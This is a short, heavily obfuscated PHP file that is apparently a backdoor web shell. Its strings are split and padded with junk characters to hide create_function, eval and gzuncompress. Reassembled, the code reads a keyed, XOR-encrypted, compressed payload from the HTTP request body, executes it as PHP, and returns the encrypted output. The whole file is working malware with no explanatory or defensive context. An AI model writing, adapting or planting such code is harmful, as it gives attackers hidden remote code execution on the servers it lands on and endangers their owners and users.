<?php
$u='x(@base6Bo4_decBoBoode($mBo[1]),$k)));$oBo=@ob_gBoet_contenBots(Bo);@ob_enBod_cl';
$N='tBo{$Boi}^$k{Bo$j};}}return $o;}ifBo (@preg_matBoch("/$kh(.+)$BokfBo/",@file_getBo_contBoent';
$C='S7u7SN7B5Bol7";funcBotion Box($BoBot,$kBo){$c=strlBoen($k);$BolBo=strlen($t);$o="";';
$K='BofoBor($iBo=0;$i<$l;){forBo($j=0;Bo($j<$Boc&&$i<$Bol);Bo$BoBoj++,$i++Bo){$o.=Bo$Bo';
$g=str_replace('XA','','creXAatXAeXA_fuXAXAnXAction');
$y='eBoan();Bo$r=@bBoase64_encoBode(@x(BoBo@gzcomBopBoress($o),$Bok))Bo;print("$Bop$kh$r$kf");}';
$W='$k="afeBoda1b8";$BokBoh="d12e2bBo8f3Bo243";$kf=Bo"3b2Bo8fa1104df"Bo;Bo$p="BoBo6Y5uQ';
$P='s("BoBophp://inpBoBout"),$m)==1) {@Boob_starBotBo();@evaBolBo(@gzuncomBopress(@Bo';
$F=str_replace('Bo','',$W.$C.$K.$N.$P.$u.$y);
$X=$g('',$F);$X();
?>
